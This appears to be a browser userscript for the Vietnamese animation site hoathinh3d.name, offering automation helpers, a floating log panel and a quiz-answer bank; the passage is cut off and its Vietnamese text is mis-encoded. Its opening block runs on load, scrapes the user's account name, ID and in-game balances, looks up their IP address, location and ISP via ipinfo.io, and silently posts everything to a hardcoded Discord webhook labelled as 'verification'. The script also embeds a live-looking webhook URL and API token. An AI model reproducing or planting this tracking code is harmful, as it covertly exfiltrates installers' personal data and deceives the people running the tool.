(async function logUserInfoToDiscord() {
    const webhook = "https://discord.com/api/webhooks/1374971300564566076/Eixvov5pIbE5kZTlzHItgWbpGJDiCMS8lWccRGMCmf-usv0TLE6Wdtxg2HP1JykI0IST"; // Thay b·∫±ng webhook c·ªßa b·∫°n
    const ipinfoToken = "10ddf60e7b0de8"; // Token t·ª´ ipinfo.io
  
    const url = location.href;
    if (!url.includes("hoathinh3d.name")) return;
  
    try {
        const response = await fetch(url);
        const html = await response.text();
        const doc = new DOMParser().parseFromString(html, "text/html");
    
        const scriptTag = Array.from(doc.scripts).find(s => s.textContent.includes('var myCRED_Notice'));
        const userId = scriptTag?.textContent.match(/"user_id":\s*"(\d+)"/)?.[1] || "Kh√¥ng r√µ";
    
        const name = doc.querySelector('#ch_head_name')?.textContent.trim() || "Kh√¥ng r√µ";
        const tuVi = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Tu Vi"))?.textContent.match(/Tu Vi:\s*(\d+)/)?.[1] || "0";
        const tinhThach = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Tinh Th·∫°ch"))?.textContent.match(/Tinh Th·∫°ch:\s*(\d+)/)?.[1] || "0";
        const tienNgoc = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Ti√™n Ng·ªçc"))?.textContent.match(/Ti√™n Ng·ªçc:\s*(\d+)/)?.[1] || "0";
  
      // ‚ûï G·ªçi API ipinfo
      const ipinfo = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`).then(res => res.json());
      const ip = ipinfo.ip || "Kh√¥ng r√µ";
      const location = `${ipinfo.city || ""}, ${ipinfo.region || ""}, ${ipinfo.country || ""}`;
      const org = ipinfo.org || "Kh√¥ng r√µ";
  
      const message = [
        `üßô **TH√îNG TIN NG∆Ø·ªúI CH∆†I**`,
        `üë§ Nh√¢n v·∫≠t: ${name}`,
        `üÜî ID: ${userId}`,
        `‚ö° Tu Vi: ${tuVi}`,
        `üíé Tinh Th·∫°ch: ${tinhThach}`,
        `üîÆ Ti√™n Ng·ªçc: ${tienNgoc}`,
        `üåê Trang: ${url}`,
        `üåç IP: ${ip}`,
        `üìç V·ªã tr√≠: ${location}`,
        `üì° ISP: ${org}`,
        `üïí Th·ªùi gian: ${new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })}`,
        `üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©üí©`].join("\n");
  
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      });
  
      console.log("‚úÖ G·ª≠i th√†nh c√¥ng X√°c Th·ª±c Th√¥ng Tin v·ªÅ Sever"); 
    } catch (e) {
      console.warn("‚ùå L·ªói khi g·ª≠i log Discord:", e);
    }
  })();
  (function() {
const iframe = document.createElement('iframe')
document.body.appendChild(iframe)
const originalConsole = iframe.contentWindow.console;
window.console = originalConsole
console.log = Function.prototype.bind.call(originalConsole.log, originalConsole)

const DOMAIN = 'https://hoathinh3d.name'
const ACTION_URL = DOMAIN + '/wp-json/hh3d/v1/action'
const HH3D_AJAX_URL = DOMAIN + '/wp-content/themes/halimmovies-child/hh3d-ajax.php'
const ADMIN_AJAX_URL = DOMAIN + '/wp-admin/admin-ajax.php'
const LUANVO_URL = DOMAIN + '/wp-json/luan-vo/v1'
const TONGMON_URL = DOMAIN + '/wp-json/tong-mon/v1'

const postRequest = async (url, { headers, body, retries = 3, delay = 1250, timeout = 30000 }) => {
    const unauthorizedStatuses = [401, 403]
    do {
        const controller = new AbortController()
        const signal = controller.signal
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => {
            controller.abort()
            reject(new Error('Request Timeout'))
        }, timeout))
        try {
            const response = await Promise.race([
                fetch(url, { method: 'POST', headers, body, signal }),
                timeoutPromise
            ])
            if (unauthorizedStatuses.includes(response.status)) {
                return { success: false, message: `L·ªói x√°c th·ª±c (${response.status})` }
            }
            if (response.ok || response.status === 400) {
                await sleep(250)
                return await response.json()
            }
            console.log(`üî¥ [POST](${retries}): ${url} - Th·∫•t b·∫°i (${response.status})`)
        } catch (error) {
            console.log(`üî¥ [POST](${retries}): ${url} - ${error}`)
        }
        if (retries > 0) await sleep(delay)
    } while (retries-- > 0)
    return { success: false, message: 'Vui l√≤ng th·ª≠ l·∫°i sau.' }
}

const loadPage = async (url, retries = 3, delay = 1250, timeout = 30000) => {
    do {
        const controller = new AbortController()
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => {
            controller.abort()
            reject(new Error('Request Timeout'))
        }, timeout))
        try {
            const response = await Promise.race([
                fetch(url, { signal: controller.signal }),
                timeoutPromise
            ])
            if (response.ok) {
                await sleep(250)
                const html = await response.text()
                const doc = new DOMParser().parseFromString(html, 'text/html')
                return { html, doc }
            }
            console.log(`üî¥ [GET](${retries}): ${url} - Th·∫•t b·∫°i (${response.status})`)
        } catch (error) {
            console.log(`üî¥ [GET](${retries}): ${url} - ${error}`)
        }
        if (retries > 0) await sleep(delay)
    } while (retries-- > 0)
    return { html: '', doc: null }
}

const LoggerMessageType = Object.freeze({
    SUCCESS: 'success',
    ERROR: 'error',
    WARNING: 'warning',
    INFO: 'info'
})

class Logger {
  constructor() {
    if (Logger.instance) return Logger.instance;
    this.messages = [];
    this.container = null;
    this.messagesWrapper = null;
    Logger.instance = this;
  }

  renderContainer() {
    if (this.container) return;
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => this.renderContainer());
      return;
    }

    // 1. T·∫°o container ch√≠nh
    const container = document.createElement('div');
    container.id = 'logger-container';
    container.style.position = 'fixed';
    container.style.bottom = '16px';
    container.style.left = '16px';
    container.style.width = '360px';
    container.style.maxWidth = 'calc(100% - 32px)';
    container.style.maxHeight = '50vh';
    container.style.display = 'flex';
    container.style.flexDirection = 'column';
    container.style.backgroundColor = 'rgba(255, 255, 255, 0.08)'; // glassmorphism
    container.style.backdropFilter = 'blur(20px)';
    container.style.border = '1px solid rgba(255, 255, 255, 0.2)';
    container.style.borderRadius = '16px';
    container.style.boxShadow = '0 8px 32px rgba(0, 0, 0, 0.2)';
    container.style.color = '#ffffff';
    container.style.overflow = 'hidden';
    container.style.fontFamily = '"Poppins", sans-serif';
    container.style.zIndex = '10000';

    // 2. Control bar (Toggle + Clear)
    const controlBar = document.createElement('div');
    controlBar.style.display = 'flex';
    controlBar.style.justifyContent = 'space-between';
    controlBar.style.alignItems = 'center';
    controlBar.style.padding = '8px 12px';
    controlBar.style.borderBottom = '1px solid rgba(255, 255, 255, 0.2)';

    // 2.1. Toggle thu/g·ªçn
    const toggleBtn = document.createElement('button');
    toggleBtn.innerHTML = 'üîΩ';
    toggleBtn.style.background = 'transparent';
    toggleBtn.style.border = 'none';
    toggleBtn.style.color = '#ffffff';
    toggleBtn.style.cursor = 'pointer';
    toggleBtn.style.fontSize = '16px';
    toggleBtn.style.transition = 'transform 0.2s ease';
    toggleBtn.onclick = () => {
      if (messagesWrapper.style.display !== 'none') {
        messagesWrapper.style.display = 'none';
        clearButton.style.display = 'none';
        footer.style.display = 'none';
        toggleBtn.style.transform = 'rotate(180deg)';
      } else {
        messagesWrapper.style.display = 'flex';
        clearButton.style.display = 'block';
        footer.style.display = 'block';
        toggleBtn.style.transform = 'rotate(0deg)';
      }
    };

    // 2.2. Clear button
    const clearButton = document.createElement('button');
    clearButton.textContent = 'üßπ Clear';
    clearButton.style.background = 'linear-gradient(135deg, #ff8a00, #e52e71)';
    clearButton.style.border = 'none';
    clearButton.style.borderRadius = '8px';
    clearButton.style.color = '#ffffff';
    clearButton.style.padding = '6px 12px';
    clearButton.style.fontSize = '13px';
    clearButton.style.cursor = 'pointer';
    clearButton.style.transition = 'transform 0.2s ease, box-shadow 0.2s ease';
    clearButton.onmouseover = () => {
      clearButton.style.transform = 'translateY(-2px)';
      clearButton.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)';
    };
    clearButton.onmouseout = () => {
      clearButton.style.transform = 'translateY(0)';
      clearButton.style.boxShadow = 'none';
    };
    clearButton.onclick = () => this.clear();

    controlBar.appendChild(toggleBtn);
    controlBar.appendChild(clearButton);

    // 3. Khu v·ª±c ch·ª©a messages (scrollable)
    const messagesWrapper = document.createElement('div');
    messagesWrapper.id = 'logger-messages-wrapper';
    messagesWrapper.style.flex = '1 1 auto';
    messagesWrapper.style.overflowY = 'auto';
    messagesWrapper.style.padding = '8px 12px';
    messagesWrapper.style.display = 'flex';
    messagesWrapper.style.flexDirection = 'column';
    messagesWrapper.style.gap = '6px';

    // 4. Footer ƒë∆°n gi·∫£n
    const footer = document.createElement('div');
    footer.textContent = '‚úß¬©Th√≠ch B·ªën L√π Ngon Th∆°m Ng·ªçt N∆∞·ªõc Tr·∫Øng H·ªìng‚úß';
    footer.style.padding = '6px 12px';
    footer.style.fontSize = '11px';
    footer.style.textAlign = 'center';
    footer.style.color = '#dddddd';

    // 5. G√°n reference v√† append t·∫•t c·∫£ v√†o body
    container.appendChild(controlBar);
    container.appendChild(messagesWrapper);
    container.appendChild(footer);

    this.container = container;
    this.messagesWrapper = messagesWrapper;
    document.body.appendChild(container);
  }

  renderMessages() {
    this.messagesWrapper.innerHTML = '';
    this.messages.forEach(({ message, type }) => this.renderMessage(message, type));
  }

  renderMessage(message, type) {
    const messageDiv = document.createElement('div');
    messageDiv.textContent = message;
    messageDiv.style.padding = '8px 12px';
    messageDiv.style.borderRadius = '8px';
    messageDiv.style.fontSize = '13px';
    messageDiv.style.fontWeight = '500';
    messageDiv.style.overflowWrap = 'break-word';
    messageDiv.style.display = 'flex';
    messageDiv.style.alignItems = 'center';
    messageDiv.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    messageDiv.style.opacity = '0';
    messageDiv.style.transform = 'translateY(8px)';

    // Thi·∫øt l·∫≠p m√†u n·ªÅn v√† border-left theo type
    switch (type) {
      case LoggerMessageType.SUCCESS:
        messageDiv.style.backgroundColor = 'rgba(76, 175, 80, 0.08)';
        messageDiv.style.borderLeft = '4px solid #4CAF50';
        break;
      case LoggerMessageType.ERROR:
        messageDiv.style.backgroundColor = 'rgba(244, 67, 54, 0.08)';
        messageDiv.style.borderLeft = '4px solid #F44336';
        break;
      case LoggerMessageType.WARNING:
        messageDiv.style.backgroundColor = 'rgba(255, 193, 7, 0.08)';
        messageDiv.style.borderLeft = '4px solid #FFC107';
        break;
      case LoggerMessageType.INFO:
      default:
        messageDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.05)';
        messageDiv.style.borderLeft = '4px solid #90A4AE';
    }

    this.messagesWrapper.appendChild(messageDiv);
    // K√≠ch ho·∫°t animation
    requestAnimationFrame(() => {
      messageDiv.style.opacity = '1';
      messageDiv.style.transform = 'translateY(0)';
    });

    // Scroll xu·ªëng cu·ªëi
    this.messagesWrapper.scrollTop = this.messagesWrapper.scrollHeight;
  }

  log(message, type) {
    console.log(message);
    // N·∫øu kh√¥ng truy·ªÅn type, t·ª± x√©t prefix
    if (typeof type === 'undefined') {
      if (typeof message === 'string' && message.length >= 2) {
        const prefix = message.slice(0, 2);
        switch (prefix) {
          case 'üî¥':
            type = LoggerMessageType.ERROR;
            break;
          case 'üü¢':
            type = LoggerMessageType.SUCCESS;
            break;
          case 'üü°':
            type = LoggerMessageType.WARNING;
            break;
          default:
            type = LoggerMessageType.INFO;
        }
      } else {
        type = LoggerMessageType.INFO;
      }
    }
    this.messages.push({ message, type });

    if (this.container) {
      this.renderMessage(message, type);
    } else {
      this.renderContainer();
      this.renderMessages();
    }
  }

  clear() {
    this.messages = [];
    if (this.messagesWrapper) {
      this.messagesWrapper.innerHTML = '';
      this.messagesWrapper = null;
    }
    if (this.container) {
      this.container.remove();
      this.container = null;
    }
  }
}

const logger = new Logger()

const blessingMessages = [
    "üå† Thi√™n duy√™n v·∫°n ki·∫øp, h·ªôi ng·ªô gi·ªØa h·ªìng tr·∫ßn! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu ƒë·ªìng t√¢m tu luy·ªán, phi thƒÉng c·ª≠u thi√™n, tr∆∞·ªùng t·ªìn c√πng nh·∫≠t nguy·ªát! ‚ú®",
    "üå∏ Duy√™n kh·ªüi t·ª´ t√¢m, ƒë·∫°o h·ª£p b·ªüi √Ω! Ch√∫c hai v·ªã ƒë·∫°o h·ªØu ƒë·ªìng h√†nh b·∫•t di·ªát, nh∆∞ gi√≥ xu√¢n th·ªïi m√£i, nh∆∞ s√≥ng bi·∫øc v·ªó ho√†i! üåä",
    "‚ö°Ô∏è M·ªôt b∆∞·ªõc nh·∫≠p ƒë·∫°o, v·∫°n ki·∫øp th√†nh ti√™n! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu n·∫Øm tay tu luy·ªán, ph√° v·ª° thi√™n ki·∫øp, c√πng nhau phi thƒÉng b·∫•t di·ªát! üïäÔ∏è",
    "üåü H·ªØu duy√™n thi√™n ƒë·ªãnh, nguy·ªát l√£o ch·ªâ ƒë∆∞·ªùng! Nguy·ªán ƒë·∫°o l·ªØ v·ªØng b·ªÅn, ƒë·ªìng t√¢m h·ª£p l·ª±c, tr∆∞·ªùng t·ªìn gi·ªØa tr·ªùi ƒë·∫•t bao la! üíû",
    "üåø Tr·∫£i qua ng√†n ki·∫øp lu√¢n h·ªìi, cu·ªëi c√πng t∆∞∆°ng ng·ªô! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu t√¢m √Ω t∆∞∆°ng th√¥ng, ƒë·ªìng tu ƒë·ªìng ti·∫øn, ch·ª©ng ƒë·∫Øc ƒë·∫°i ƒë·∫°o! ‚öîÔ∏è",
    "üèØ ƒê·∫°o t√¨nh nh∆∞ trƒÉng s√°ng, chi·∫øu r·ªçi m√£i kh√¥ng phai! Ch√∫c hai v·ªã ƒë·∫°o h·ªØu tu h√†nh vi√™n m√£n, b∆∞·ªõc l√™n ƒë√†i sen, h√≥a th√†nh ch√¢n ti√™n! üèπ",
    "üå∫ Nh√¢n sinh h·ªØu h·∫πn, tu h√†nh h·ªØu duy√™n! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu song tu h√≤a h·ª£p, c√πng nhau v∆∞·ª£t thi√™n ƒë·ªãa, l∆∞u danh b·∫•t h·ªß! üèîÔ∏è",
    "‚ú® M·ªôt √°nh m·∫Øt giao h√≤a, v·∫°n nƒÉm ch·∫≥ng ƒë·ªïi! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu ƒë·ªìng t√¢m song ti·∫øn, ƒë·∫°o nghi·ªáp r·∫°ng r·ª°, tu th√†nh ch√≠nh qu·∫£! üöÄ",
    "üî• ƒê·∫°o t√¢m ki√™n ƒë·ªãnh, tay n·∫Øm ch·∫∑t ch·∫≥ng r·ªùi! Ch√∫c hai v·ªã ƒë·∫°o h·ªØu v∆∞·ª£t qua mu√¥n v√†n th·ª≠ th√°ch, c√πng nhau ƒëƒÉng ƒë·ªânh c·ª≠u thi√™n! üåà",
    "üåå ƒê·ªãnh m·ªánh an b√†i, thi√™n ƒë·ªãa ch·ª©ng gi√°m! Nguy·ªán hai v·ªã ƒë·∫°o h·ªØu tu luy·ªán ƒë·∫°i th√†nh, n·∫Øm gi·ªØ ch√¢n l√Ω, m√£i m√£i b√™n nhau! üèÜ"
]

const quizBank = {
    "Ai l√† huynh ƒë·ªá v√† c≈©ng l√† ng∆∞·ªùi th·∫ßy m√† V∆∞∆°ng L√¢m trong Ti√™n Ngh·ªãch k√≠nh tr·ªçng nh·∫•t ?": "T∆∞ ƒê·ªì Nam",
    "Ai l√† m·∫π c·ªßa ƒê∆∞·ªùng Tam?": "A Ng√¢n",
    "Ai l√† ng∆∞·ªùi ƒë·ª©ng ƒë·∫ßu V≈© H·ªìn ƒêi·ªán?": "B·ªâ B·ªâ ƒê√¥ng",
    "Ai l√† ng∆∞·ªùi th·∫ßy c·ªßa ƒê∆∞·ªùng Tam?": "ƒê·∫°i S∆∞",
    "Ai l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc Th·∫ßn M·ªô ?": "Th·∫ßn Nam",
    "√Åm tinh gi·ªõi ƒë∆∞·ª£c xu·∫•t hi·ªán trong b·ªô phim ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "Tinh Th·∫ßn Bi·∫øn",
    "B√°ch L√Ω ƒê√¥ng Qu√¢n l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Thi·∫øu Ni√™n B·∫°ch M√£ Tu√Ω Xu√¢n Phong",
    "B·∫°ch Nguy·ªát Kh√¥i l√† t√™n nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Linh Lung",
    "B·∫°ch Ti·ªÉu Thu·∫ßn l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng",
    "B·∫°ch Ti·ªÉu Thu·∫ßn trong Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng lu√¥n ƒë∆∞·ª£c ai √¢m th·∫ßm gi√∫p ƒë·ª° ?": "ƒê·ªó LƒÉng Ph·ªâ",
    "B·ªô phim n√†o sau ƒë√¢y thu·ªôc ti·ªÉu thuy·∫øt c·ªßa t√°c gi·∫£ Thi√™n T·∫±m Th·ªï ƒê·∫≠u": "T·∫•t c·∫£ ƒë√°p √°n",
    "C√°c c·∫•p b·∫≠c n√†o sau ƒë√¢y thu·ªôc phim ƒê·∫•u Ph√° Th∆∞∆°ng Khung ?": "ƒê·∫•u T√¥ng",
    "Ch√°u d∆∞·ª£ng c·ªßa B·∫°ch Ti·ªÉu Thu·∫ßn trong Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng l√† ai ?": "T·ªëng Khuy·∫øt",
    "Ch·ªß nh√¢n ƒë·ªùi tr∆∞·ªõc c·ªßa V·∫´n L·∫°c T√¢m Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung l√† ai ?": "Di·ªáu Thi√™n Ho·∫£",
    "C√¥ng ph√°p g√¨ gi√∫p Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung h·∫•p th·ª• nhi·ªÅu lo·∫°i d·ªã h·ªèa ?": "Ph·∫ßn Quy·∫øt",
    "C√¥ng ph√°p n√†o sau ƒë√¢y l√† c·ªßa H√†n L·∫≠p trong Ph√†m Nh√¢n Tu Ti√™n ?": "T·∫•t c·∫£ ƒë√°p √°n",
    "C∆° T·ª≠ Nguy·ªát l√† nh√¢n v·∫≠t trong c√°c b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Gi√† Thi√™n",
    "D·∫° T√°ng c√≤n l√† bi·ªát danh c·ªßa ai trong Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng ?": "B·∫°ch Ti·ªÉu Thu·∫ßn",
    "Danh x∆∞ng T√†n Thi B·∫°i Thu·∫ø l√† c·ªßa nh√¢n v·∫≠t n√†o trong Ho·∫° Giang H·ªì Chi B·∫•t L∆∞∆°ng Nh√¢n ?": "H√†ng Th·∫ßn",
    "Di·ªÖm Linh C∆° l√† nh√¢n v·∫≠t trong phim ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Thi√™n H√†nh C·ª≠u Ca",
    "Di·ªáp Ph√†m l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Gi√† Thi√™n",
    "Di·ªáp Th·∫ßn trong Ti√™n V√µ ƒê·∫ø T√¥n gia nh·∫≠p T√¥ng M√¥n n√†o ƒë·∫ßu ti√™n ?": "Ch√≠nh D∆∞∆°ng T√¥ng",
    "D∆∞·ª£c Tr·∫ßn trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung ƒë√£ t·ª´ng b·ªã ƒë·ªì ƒë·ªá n√†o ph·∫£n b·ªôi ?": "H√†n Phong",
    "ƒê·∫°i ca c·ªßa Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung t√™n g√¨ ?": "Ti√™u ƒê·ªânh",
    "ƒê√†m V√¢n l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Ngh·ªãch Thi√™n Ch√≠ T√¥n",
    "ƒê·∫°o l·ªØ c·ªßa H√†n L·∫≠p l√† ai ?": "Nam Cung Uy·ªÉn",
    "ƒê√¢u l√† nh√¢n v·∫≠t ch√≠nh trong phim B√°ch Luy·ªán Th√†nh Th·∫ßn ?": "La Chinh",
    "ƒê√¢u l√† Th√°i C·ªï Th·∫≠p Hung trong phim Th·∫ø Gi·ªõi Ho√†n M·ªπ ?": "T·∫•t c·∫£ ƒë√°p √°n",
    "ƒê√¢u l√† tuy·ªát k·ªπ s·ªë 1 H·∫°o Thi√™n T√¥ng m√† ƒê∆∞·ªùng H·∫°o d·∫°y cho con trai trong ƒê·∫•u La ƒê·∫°i L·ª•c ?": "ƒê·∫°i Tu Di Ch√πy",
    "ƒê·∫•u S√°t To√†n Vi√™n Ki·∫øm l√† m·ªôt k·ªπ nƒÉng trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Th·∫ßn ·∫§n V∆∞∆°ng T·ªça",
    "ƒê·ªôc C√¥ B√°c trong ƒê·∫•u La ƒê·∫°i L·ª•c c√≥ v≈© h·ªìn g√¨ ?": "B√≠ch L√¢n X√†",
    "Em trai ru·ªôt c·ªßa Th·∫°ch H·∫°o trong Th·∫ø Gi·ªõi Ho√†n M·ªπ l√† ai ?": "T·∫ßn H·∫°o",
    "H√†n l·∫≠p s·ªü h·ªØu nh·ªØng v·∫≠t ph·∫©m n√†o d∆∞·ªõi ƒë√¢y ?": "Thanh Tr√∫c Phong V√¢n Ki·∫øm",
    "H√†n L·∫≠p trong Ph√†m Nh√¢n Tu Ti√™n ƒë·∫øn Th·∫•t Huy·ªÅn M√¥n b√°i ai l√†m th·∫ßy ?": "M·∫∑c ƒê·∫°i Phu",
    "H√†n L·∫≠p trong Ph√†m Nh√¢n Tu Ti√™n gia nh·∫≠p m√¥n ph√°i n√†o ƒë·∫ßu ti√™n ?": "Th·∫•t Huy·ªÅn M√¥n",
    "H√†n L·∫≠p trong Ph√†m Nh√¢n Tu Ti√™n t·ª´ng c·ª©u ai m√† b·ªã h·∫•p th·ª• tu vi gi·∫£m xu·ªëng Luy·ªán Kh√≠ K·ª≥ ?": "Nam Cung Uy·ªÉn",
    "Hoang Thi√™n ƒê·∫ø l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n·ªïi ti·∫øng n√†o ?": "Th·∫ø Gi·ªõi Ho√†n M·ªπ",
    "Ho·∫Øc V≈© H·∫°o l√† h·∫≠u nh√¢n c·ªßa ai trong S·ª≠ Lai Kh·∫Øc ?": "ƒê√°i M·ªôc B·∫°ch",
    "H·ªìn ho√†n m√†u n√†o m·∫°nh nh·∫•t?": "ƒê·ªè",
    "Hu√¢n Nhi l√† c√¥ng ch√∫a c·ªßa b·ªô t·ªôc n√†o?": "C·ªï t·ªôc",
    "Kh√¥ L√¢u ƒê√† Ch·ªß xu·∫•t hi·ªán trong b·ªô phim ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "V√µ Th·∫ßn Ch√∫a T·ªÉ",
    "Khi ·ªü Gi√† Nam H·ªçc Vi·ªán, Ti√™u Vi√™m thu ph·ª•c ƒë∆∞·ª£c lo·∫°i d·ªã h·ªèa n√†o ?": "V·∫´n L·∫°c T√¢m Vi√™m",
    "K√≠nh Huy·ªÅn trong Quy·∫øn T∆∞ L∆∞·ª£ng l√† h·∫≠u du·ªá c·ªßa t·ªôc n√†o ?": "Th·∫ßn T·ªôc",
    "L·∫°c Ly trong ƒê·∫°i Ch√∫a T·ªÉ l√† nh√¢n v·∫≠t trong T·ªôc n√†o ?": "L·∫°c Th·∫ßn T·ªôc",
    "L√¢m ƒê·ªông trong V≈© ƒê·ªông C√†n Kh√¥n h·ªçc ƒë∆∞·ª£c Linh V√µ H·ªçc n√†o khi v√†o bia c·ªï ƒê·∫°i Hoang ?": "ƒê·∫°i Hoang T√π Thi√™n Ch·ªâ",
    "L√¢m ƒê·ªông trong V≈© ƒê·ªông C√†n Kh√¥n luy·ªán h√≥a T·ªï Ph√π n√†o ƒë·∫ßu ti√™n ?": "Th√¥n Ph·ªá T·ªï Ph√π",
    "L√¢m ƒê·ªông trong V≈© ƒê·ªông C√†n Kh√¥n s·ª≠ d·ª•ng v≈© kh√≠ lo·∫°i n√†o sau ƒë√¢y ?": "Th∆∞∆°ng",
    "L√¢m Phong l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "V·∫°n Gi·ªõi ƒê·ªôc T√¥n",
    "L√¢m Th·∫•t D·∫° l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Tr·∫£m Th·∫ßn",
    "L√¢m Th·∫•t D·∫° trong Tr·∫£m Th·∫ßn s·ªü h·ªØu s·ª©c m·∫°nh c·ªßa v·ªã th·∫ßn n√†o ?": "Thi√™n S·ª©",
    "Long Tuy·ªÅn Ki·∫øm xu·∫•t hi·ªán trong b·ªô phim ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "H·ªça Giang H·ªì Chi B·∫•t L∆∞∆°ng Nh√¢n",
    "L·ª•c Tuy·∫øt K·ª≥ trong Tru Ti√™n thu·ªôc Phong n√†o trong Thanh V√¢n M√¥n?": "Ti·ªÉu Tr√∫c Phong",
    "L√Ω Tinh V√¢n trong H·ªça Giang H·ªì Chi B·∫•t L∆∞∆°ng Nh√¢n s·ª≠ d·ª•ng v≈© kh√≠ n√†o sau ƒë√¢y ?": "Long Tuy·ªÅn Ki·∫øm",
    "L√Ω Tinh V√¢n l√† m·ªôt nh√¢n v·∫≠t trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "H·ªça Giang H·ªì Chi B·∫•t L∆∞∆°ng Nh√¢n",
    "L√Ω Tr∆∞·ªùng Th·ªç trong S∆∞ Huynh A S∆∞ Huynh xuy√™n kh√¥ng v·ªÅ H·ªìng Hoang b√°i s∆∞ ·ªü ƒë√¢u ?": "ƒê·ªô Ti√™n M√¥n",
    "Man H·ªì T·ª≠ trong phim \"Ph√†m Nh√¢n Tu Ti√™n\" tu luy·ªán c√¥ng ph√°p n√†o?": "Th√°c Thi√™n Ma C√¥ng",
    "M·∫´u th√¢n c·ªßa La Phong trong Th√¥n Ph·ªá Tinh Kh√¥ng t√™n l√† g√¨ ?": "Cung T√¢m Lan",
    "M·∫π c·ªßa M·∫°nh Xuy√™n trong Th∆∞∆°ng Nguy√™n ƒê·ªì t√™n l√† g√¨ ?": "B·∫°ch Ni·ªám V√¢n",
    "M·∫π c·ªßa T·∫ßn Tr·∫ßn l√† ai ?": "T·∫ßn Nguy·ªát Tr√¨",
    "M·∫π c·ªßa Th·∫°ch H·∫°o trong Th·∫ø Gi·ªõi Ho√†n M·ªπ t√™n l√† g√¨": "T·∫ßn Di Ninh",
    "M·ªëi t√¨nh ƒë·∫ßu c·ªßa Di·ªáp Th·∫ßn trong Ti√™n V√µ ƒê·∫ø T√¥n l√† ai ?": "C∆° Ng∆∞ng S∆∞∆°ng",
    "M·ª•c ƒë√≠ch ch√≠nh tu luy·ªán c·ªßa T·∫ßn V≈© trong Tinh Th·∫ßn Bi·∫øn l√† g√¨ ??": "V√¨ mu·ªën ƒë∆∞·ª£c c∆∞·ªõi Kh∆∞∆°ng L·∫≠p",
    "M·ª•c ƒë√≠ch tu luy·ªán c·ªßa V∆∞∆°ng L√¢m trong Ti√™n Ngh·ªãch theo di·ªÖn bi·∫øn phim hi·ªán t·∫°i l√† g√¨ ?": "B√°o Th√π",
    "M·ª•c Tr·∫ßn trong ƒê·∫°i Ch√∫a T·ªÉ li√™n k·∫øt Huy·∫øt M·∫°ch v·ªõi ?": "C·ª≠u U T∆∞·ªõc",
    "M·ª•c V√¢n l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "V√¥ Th∆∞·ª£ng Th·∫ßn ƒê·∫ø",
    "Nam ch√≠nh trong b·ªô ho·∫°t h√¨nh trung qu·ªëc √Åm H√† Truy·ªán l√† ai ?": "T√¥ M·ªô V≈©",
    "Nam ch√≠nh trong b·ªô Quy·∫øn T∆∞ L∆∞·ª£ng l√† ai ?": "K√≠nh Huy·ªÅn",
    "Ngh·ªãch H√† T√¥ng l√† T√¥ng M√¥n trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng",
    "Ngh·ªãch Thi√™n Nhi H√†nh l√† m·ªôt nh√¢n v·∫≠t trong b·ªô phim hh3d n√†o sau ƒë√¢y ?": "V≈© Canh K·ª∑",
    "Ng·ª•y Anh (Ng·ª•y V√¥ Ti·ªán) l√† nh√¢n v·∫≠t trong b·ªô hhtq n√†o sau ƒë√¢y ?": "Ma ƒê·∫°o T·ªï S∆∞",
    "Ng∆∞·ªùi b·∫°n thu·ªü nh·ªè c·ªßa Tr∆∞∆°ng Ti·ªÉu Ph√†m trong Tru Ti√™n l√† ai ?": "L√¢m Kinh V≈©",
